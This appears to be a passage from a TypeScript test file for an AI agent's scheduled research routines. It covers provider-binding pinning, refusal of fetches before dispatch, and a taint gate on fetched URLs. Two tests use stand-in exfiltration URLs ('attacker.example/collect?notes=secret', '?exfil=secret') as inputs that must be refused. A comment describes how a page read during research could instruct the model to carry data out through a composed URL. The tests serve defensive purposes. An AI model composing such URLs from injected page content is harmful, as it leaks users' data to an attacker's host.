    resolveBinding: async () => {
      throw new TaviError("UNAVAILABLE", "offline");
    },
    stream: async (request) => {
      dispatched++;
      return { attemptId: request.attemptId, status: "completed", text: "", toolCalls: [], usage: {} };
    },
  };
  const result = await routineModelPort(model, asyncRoutineEffects(f.runs), f.run, f.fence, "research").stream(
    { runId: "worker", attemptId: "missing", attemptNumber: 1, connectionId: "fixture", model: "v1", messages: [], tools: [] },
    { signal: new AbortController().signal, onEvent() {} },
  );
  expect(result).toMatchObject({ status: "failed", error: { code: "model_unavailable" } });
  expect(dispatched).toBe(0);
  expect(f.runs.get(scope, f.run.runId).data.modelCalls).toBe(0);
});

it("refuses portable fetch content without a separate host receipt", () => {
  const f = fixture();
  const news = new RoutineNewsService(f.runs);
  expect(() =>
    news.capture(
      f.fence,
      "web_fetch",
      { url: "https://example.com/page" },
      {
        url: "https://example.com/page",
        statusCode: 200,
        body: { kind: "text", content: "claim" },
        truncated: false,
        addressClass: "public",
      },
    ),
  ).toThrow(/host transport receipt/);
  expect(news.sources(scope, f.run.runId)).toHaveLength(0);
});

it("pins the web search binding: a changed provider refuses a new revision and a reservation under another binding", () => {
  const store = new SqliteStore({ databasePath: ":memory:", inMemory: true });
  stores.push(store);
  const now = "2026-09-20T06:00:00.000Z";
  const pinned = "a".repeat(64);
  const changed = "c".repeat(64);
  const service = (search: string) =>
    new RoutineService(store, {
      toolBindings: { [scope.workspaceId]: { [scope.principalId]: { web_search: search } } },
      executionAvailable: true,
      now: () => now,
      nextOccurrence: (trigger) => (trigger.kind === "once" ? null : "2026-09-21T06:00:00.000Z"),
    });
  const routines = service(pinned);
  const created = routines.create(scope, newsRoutine(["example.com"]));
  expect(created.revision.snapshot.permissions.providerBindings).toEqual({ web_search: pinned });
  routines.finishEvaluation(scope, created.routine.routineId, 1, true, "pass");
  const reconfigured = service(changed);
  const current = reconfigured.get(scope, created.routine.routineId);
  expect(() =>
    reconfigured.update(scope, {
      routineId: created.routine.routineId,
      operationKey: "update",
      expectedVersion: current.routine.version,
      snapshot: current.revision.snapshot,
      changeSummary: "Retry",
    }),
  ).toThrow(/Routine web provider changed/);
  expect(reconfigured.get(scope, created.routine.routineId).revision.revision).toBe(1);
  const runs = new RoutineExecutionService(routines, {
    ownerEpoch: "one",
    now: () => now,
    authorized: () => true,
    researchReady: () => ({ ready: true as const }),
  });
  const started = runs.request(scope, created.routine.routineId, "manual");
  const fence = runs.start(scope, started.runId)!;
  const grantId = runs.get(scope, started.runId).grantId;
  expect(() => runs.reserveTool(fence, "web_search", undefined, { grantId, bindingHash: changed })).toThrow(
    /binding changed since admission/,
  );
  expect(runs.get(scope, started.runId).data.toolCalls).toBe(0);
  runs.reserveTool(fence, "web_search", undefined, { grantId, bindingHash: pinned });
  expect(runs.get(scope, started.runId).data.toolCalls).toBe(1);
});

it("refuses a changed fetch account generation before dispatch", async () => {
  const f = fixture();
  const generation = "a".repeat(64);
  const snapshot = {
    ...f.run.snapshot,
    permissions: {
      ...f.run.snapshot.permissions,
      researchTools: ["web_fetch"],
      networkMode: "open_web" as const,
      providerBindings: { web_fetch: generation },
    },
  };
  const run = { ...f.run, snapshot };
  const execution = {
    ownerSession: "owner",
    implementationHash: "b".repeat(64),
    signal: new AbortController().signal,
    actsIn: (_workspaceId: string, principalId: string) => principalId === scope.principalId,
    ledger: { reserveOperation: async () => {}, finishOperation: async () => {}, operations: async () => [] },
  };
  const effects = asyncRoutineEffects(f.runs);
  const tools = new ToolRegistry();
  registerFetchTool(tools, { networkMode: "open_web", execution });
  let requests = 0;
  const scoped = routineResearchTools(
    tools,
    {
      ...effects,
      options: {
        ...effects.options,
        publicFetch: {
          execution,
          bindingGeneration: async () => "c".repeat(64),
          resolve: async () => {
            requests++;
            return ["93.184.216.34"];
          },
        },
      },
    },
    run,
    f.fence,
  );
  const tool = scoped.get("web_fetch")!;
  const context = { ...scope, runId: "worker", caller: "routine" };
  const input = { url: "https://example.com/page" };
  const binding = await tool.resolveBinding!(input, context);
  await expect(
    tool.handler({ input, context, signal: new AbortController().signal, expectedBindingHash: binding.bindingHash }),
  ).rejects.toThrow(/binding changed since its revision/);
  expect(requests).toBe(0);
});

it("contains a failed call's evidence capture: an unrecordable URL never becomes an unhandled rejection", async () => {
  // The capture rejects as `news.capture` does for a URL evidence cannot hold
  // (not HTTPS, not a URL). Left unawaited, that rejection ended the owner process.
  const f = fixture();
  const failing = new ToolRegistry();
  failing.register({
    id: "http.request",
    sink: "network",
    urlOnly: false,
    version: "1.0.0",
    description: "Failing fixture",
    effect: "read-only",
    requiredPermissions: [],
    inputSchema: z.looseObject({ url: z.string() }),
    handler: async () => {
      throw new Error("upstream down");
    },
  });
  const unhandled: unknown[] = [];
  const listen = (reason: unknown): void => {
    unhandled.push(reason);
  };
  process.on("unhandledRejection", listen);
  try {
    const tools = routineResearchTools(failing, asyncRoutineEffects(f.runs), f.run, f.fence, async () => {
      throw new Error("Evidence URL must be public HTTPS");
    });
    await expect(call(tools, "http.request", { url: "https://example.com/news" })).rejects.toThrow("upstream down");
    await new Promise((resolve) => setImmediate(resolve));
    expect(unhandled).toEqual([]);
  } finally {
    process.off("unhandledRejection", listen);
  }
});

it("refuses an open-web fetch of a URL the run was never shown, and records the refusal before any request", async () => {
  // A page read during research can instruct the model; a URL the model then
  // composes (with what it read folded in) would carry that material to the
  // page's chosen host. Only URLs this run's own search returned are fetchable.
  const f = fixture();
  const snapshot = {
    ...f.run.snapshot,
    permissions: { ...f.run.snapshot.permissions, researchTools: ["web_search", "web_fetch"], networkMode: "open_web" as const },
  };
  const run = { ...f.run, snapshot };
  const execution = {
    ownerSession: "owner",
    implementationHash: "b".repeat(64),
    signal: new AbortController().signal,
    actsIn: (_workspaceId: string, principalId: string) => principalId === scope.principalId,
    ledger: { reserveOperation: async () => {}, finishOperation: async () => {}, operations: async () => [] },
  };
  const registry = new ToolRegistry();
  registerFetchTool(registry, { networkMode: "open_web", execution });
  registry.register({
    id: "web_search",
    sink: "search",
    version: "1.0.0",
    description: "Search fixture",
    effect: "read-only",
    requiredPermissions: [],
    inputSchema: z.looseObject({ query: z.string() }),
    handler: async () => ({ sources: [{ url: "https://example.com/release" }] }),
  });
  let requests = 0;
  const effects = asyncRoutineEffects(f.runs);
  const tools = routineResearchTools(
    registry,
    {
      ...effects,
      options: {
        ...effects.options,
        publicFetch: {
          execution,
          resolve: async () => {
            requests++;
            return ["93.184.216.34"];
          },
        },
      },
    },
    run,
    f.fence,
  );
  const context = { ...scope, runId: "worker", caller: "routine" };
  const fetch = async (url: string) => {
    const tool = tools.get("web_fetch")!;
    const binding = await tool.resolveBinding!({ url }, context);
    return tool.handler({ input: { url }, context, signal: new AbortController().signal, expectedBindingHash: binding.bindingHash });
  };
  await expect(fetch("https://attacker.example/collect?notes=secret")).rejects.toThrow(/limited to pages this run's searches returned/);
  await tools.get("web_search")!.handler({ input: { query: "release" }, context, signal: new AbortController().signal });
  // The search's own result is now reachable; a URL composed beside it is not.
  await expect(fetch("https://example.com/release?exfil=1")).rejects.toThrow(/limited to pages/);
  expect(requests).toBe(0);
  const denials = f.runs.ledger(scope, f.id).filter((event) => event.envelope.decision === "deny" && event.envelope.tool === "web_fetch");
  expect(denials).toHaveLength(2);
});

it("tells the gate a research fetch's URL: under taint a search result's page is fetched, a URL composed beside it refused", () => {
  const f = fixture();
  const snapshot = {
    ...f.run.snapshot,
    permissions: { ...f.run.snapshot.permissions, researchTools: ["web_search", "web_fetch"], networkMode: "open_web" as const },
  };
  const execution = {
    ownerSession: "owner",
    implementationHash: "b".repeat(64),
    signal: new AbortController().signal,
    actsIn: () => true,
    ledger: { reserveOperation: async () => {}, finishOperation: async () => {}, operations: async () => [] },
  };
  const registry = new ToolRegistry();
  registerFetchTool(registry, { networkMode: "custom_hosts", allowedHosts: [], execution });
  const tool = routineResearchTools(registry, asyncRoutineEffects(f.runs), { ...f.run, snapshot }, f.fence).get("web_fetch")!;
  const context = { ...scope, runId: "worker", caller: "routine" };
  // What the research turn's search returned is known: its result's URLs.
  const known = new Set([normalizeUrl("https://example.com/release") ?? ""]);
  const verdict = (url: string) =>
    evaluateGate({
      toolId: "web_fetch",
      effect: "read-only",
      sink: "network",
      urlOnly: true,
      rules: [],
      sessionGrants: [],
      gatedEffects: new Set(),
      tainted: true,
      label: untrustedLabel("search"),
      knownUrls: known,
      taintMode: "enforce",
      assessment: tool.assess!({ url }, context),
    });
  expect(verdict("https://example.com/release")).toMatchObject({ decision: "allow" });
  const composed = verdict("https://example.com/release?exfil=secret");
  expect(composed).toMatchObject({ decision: "ask", gateReason: "novel-url" });
  // A URL the assessor cannot read is never known: it asks too.
  expect(tool.assess!({ url: 7 }, context)).not.toHaveProperty("urls");
  expect(
    evaluateGate({
      toolId: "web_fetch",
      effect: "read-only",
      sink: "network",
      urlOnly: true,
      rules: [],
      sessionGrants: [],
      gatedEffects: new Set(),
      tainted: true,
      label: untrustedLabel("search"),
      knownUrls: known,
      taintMode: "enforce",
      assessment: tool.assess!({ url: 7 }, context),
    }),
  ).toMatchObject({ decision: "ask", gateReason: "novel-url" });
  // Nobody attends a routine's research: the ask is a refusal.
  expect(unattendedDenial({ gateReason: composed.gateReason ?? "novel-url", risk: composed.risk })).toMatch(/novel-url/);
});
